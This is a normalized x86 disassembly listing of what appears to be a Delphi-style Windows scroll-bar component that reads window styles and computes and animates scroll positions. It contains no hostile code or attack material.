push sub_3ac46bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_3ac463c
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac46c4
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
sub_3ac46cc
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x4 ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ac4760
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7aad0
mov edi esi
movzx edx [ edi + 0x1c ]
mov eax ebx
call sub_3ac503c
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_3ac5018
mov edx [ edi + 0xc ]
mov eax ebx
call sub_3ac4ec8
movzx eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ac47b0
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_3ac4970
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab02c4
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_3ac4ec8
xor edx edx
mov eax ebx
call sub_3ac4ec8
jmp r-xdata
sub_3ac47e8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_3ac4858
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
movzx eax [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
cmp edx eax
jl r-xdata
movzx eax [ r-xdata ]
and al [ ebx + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax edx
sub_3ac48c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x258 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_3ac5000
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_3ab3ba4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_3ac5000
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_3ab3b68
call sub_3ac4858
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_3ab3b68
call sub_3ac47e8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_3ac4970
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3ac49a8
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_3ac49dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_3ac49a8
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_3ac49a8
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_3ac4a58
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_3ac49dc
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3aaf4fc
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_3ac49dc
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3aaf540
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_3ac4af0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_3ac4b50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_3ac4d2a ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac4a58
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac4a58
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov edi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
push ebp
call sub_3ac4af0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ebx
mov [ ebp - 0xc ] eax
mov edi ebx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
push ebp
call sub_3ac4af0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call GetTickCount
mov ebx eax
mov esi ebx
sub esi [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x20 ]
jae r-xdata
xor edi edi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
sub eax esi
push eax
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
dec edi
test edi edi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3ac4ec8
jmp r-xdata
sub_3ac4e50
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_3ac5548
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_3ac4ec8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_3ab7c38
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_3ab7c38
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_3ab77e4
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_3ab77e4
jmp r-xdata
xor edx edx
call sub_3ac463c
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x298 ] 0x0
je r-xdata
mov eax [ eax + 0x298 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_3ac4f8c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_3ac5548
test esi esi
jne r-xdata
movzx eax [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_3ac5048
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
call sub_3aa18a4
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
call sub_3aa18a4
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
call sub_3aa18a4
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_3a88d54
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
call sub_3aa18a4
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
call sub_3aa18a4
sub_3ac5150
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_3ac4a58
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
movzx ecx [ ebp - 0x6 ]
movzx edx [ ebp - 0x5 ]
mov eax [ esi ]
call sub_3ac4a58
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
movzx eax [ eax + 0x44 ]
call sub_3ac5048
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_3ab7c38
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_3ac4ec8
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_3ac4a58
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_3ac526c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ab29f0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ac46cc
mov [ esi + 0x250 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ac46cc
mov [ esi + 0x254 ] eax
mov [ esi + 0x258 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ac52e4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x250 ]
call sub_3a64380
mov eax [ esi + 0x254 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ab2b34
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ac5330
push ebx
mov ebx eax
mov eax ebx
call sub_3ab3e5c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_3ac5548
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_3a6dbb4
test al al
jne r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call sub_3aa18d8
sub_3ac5370
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ac54c8
mov ecx edi
mov edx esi
mov eax ebx
call sub_3ab3528
pop edi
pop esi
pop ebx
retn
sub_3ac53b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3ac54b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_3aaf4fc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x250 ]
mov eax ebx
call sub_3ac4970
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_3ac4ec8
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab3b68
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_3a7a33c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_3aaf210
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac54bf
mov eax [ ebp - 0x10 ]
call sub_3a64380
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3ac47b0
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_3a7a494
xor ecx ecx
mov edx 0xb03e
call sub_3ab0e78
inc ebx
dec esi
jne r-xdata
sub_3ac54ec
push ebx
mov ebx eax
cmp dl [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x250 ]
call sub_3ac5018
xor edx edx
mov eax [ ebx + 0x254 ]
call sub_3ac5018
mov eax ebx
call sub_3ac54c8
jmp r-xdata
sub_3ac5548
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x260 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
xor eax eax
push ebp
push sub_3ac5633
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_3ac4ad8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_3ac4ad8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov cl 0x1
xor edx edx
call sub_3ac5150
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
xor ecx ecx
mov dl 0x1
call sub_3ac5150
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
xor ecx ecx
xor edx edx
call sub_3ac5150
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor ecx ecx
mov dl 0x1
call sub_3ac5150
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
mov cl 0x1
xor edx edx
call sub_3ac5150
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
xor ecx ecx
mov dl 0x1
call sub_3ac5150
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x260 ] 0x0
retn
sub_3ac5658
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x250 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x254 ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_3aaf610
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_3aaf6c0
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_3aaf610
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_3aaf6c0
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_3aaf4fc
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x250 ]
